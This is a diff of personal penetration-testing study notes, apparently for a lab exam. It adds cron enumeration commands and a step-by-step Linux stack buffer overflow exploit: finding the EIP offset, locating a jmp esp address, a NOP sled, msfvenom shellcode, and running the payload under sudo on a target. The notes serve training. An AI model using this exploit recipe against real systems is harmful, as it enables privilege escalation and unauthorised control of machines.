@@ -54,8 +54,9 @@ ssh onto box with user that mathces /etc/passwd
 
 ---------- 10.50.26.172 ----------
 hostname
-whoami
 	PublicFacingWebsite
+whoami
+	user2
 bash
 cat /etc/hosts
 	192.168.28.181 WebApp
@@ -189,8 +190,123 @@ powershell
 		auditpol /get /category:* | findstr /i "success failure"
 
 
+------------ LINUX EXTRAS ------------
+reverse engineering is on the test
+
+Cronjobs
+	crontab -l
+	cat /etc/crontab
+	ls /etc/* | grep cron 2>/dev/null
+	find / -name "*cron*" 2>/dev/null
 
 
+./ measn current directory
+./script.py
+no need to use ./ls
+
+---------------------------LINOPS---------------------------
+buffer overflows (found with gdb installed and (under sudo -l or find commands))
+verify program is even overflowable
+./func
+gdb func
+	pdisass main
+	pdisass getuserinput
+		look for red
+		only three attempts try all if red if enough
+exit
+vim lin_buff.py
+	buff = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
+	print(buff)
+	
+gdb func
+	run <<< $(python2 lin_buff.py)
+	copy EIP hex value paste into wiremask to receive offset (Dont hit enter, click out)
+	remove pattern from lin_buff.py
+	
+vim lin_buff.py
+	buff = "A" * <offset>
+	eip = "B" * 4 (Just to confirm)
+	print(buff + eip)
+	
+env - gdb func 
+	show env (unset all inside)
+		unset env LINES
+		unset env COLUMNS
+	run <<< $(python2 lin_buff.py) or run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+	info proc map
+		Copy first Start addr below Heap
+		copy last end addr above stack
+	find /b <first start addr>, <last end addr>, 0xff, 0xe4
+		copy over five and comment them in the lin_buff.py
+		
+	vim lin_bugg.py
+	
+		buff = "A" * <offset>
+		eip = "\xef\x59\xf6\xf7"
+		
+		'''
+		#0xf7 f6 59 ef
+		#0xf7f6b3b
+		'''
+		
+		nop = "\x90" * 10
+		
+		print(buff + eip + nop)
+		
+	msfvenom -p linux/x86/exec CMD="whoami" -b "\x00" -f python
+
+	vim lin_bugg.py
+	
+		buff = "A" * <offset>
+		eip = "\xef\x59\xf6\xf7"
+		
+		'''
+		#0xf7 f6 59 ef
+		#0xf7f6b3b
+		'''
+		
+		nop = "\x90" * 10
+		
+		paste buf = b"" and lines below
+		
+		print(buff + eip + nop + buf)
+		
+./func <<< $(python2 lin_buff.py)
+sudo ./func <<< $(python2 lin_buff.py)
+		IF this didn't work, check for approriate parts, regenerate shell code, if neither is wrong use different eip.
+	
+get script over to the target
+	copt and paste the script to /tmp
+grab the target eip
+	redo the info proc map steps
+
+		env - gdb func 
+			show env (unset all inside)
+				unset env LINES
+				unset env COLUMNS
+			run <<< $(python2 lin_buff.py) or run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+			info proc map
+				Copy first Start addr below Heap
+				copy last end addr above stack
+			find /b <first start addr>, <last end addr>, 0xff, 0xe4
+				copy over five and comment them in the lin_buff.py
+		
+			vim lin_bugg.py
+	
+				buff = "A" * <offset>
+				eip = "\xef\x59\xf6\xf7"
+		
+				'''
+				#0xf7 f6 59 ef
+				#0xf7f6b3b
+				'''
+		
+				nop = "\x90" * 10
+		
+				print(buff + eip + nop)
+
+
+======================================================================================================================================
 win_buff.py
 #!/usr/bin/python
   2 
@@ -252,6 +368,9 @@ win_buff.py
  58 
  59 s.close()
  
+
+
+
 
 
 
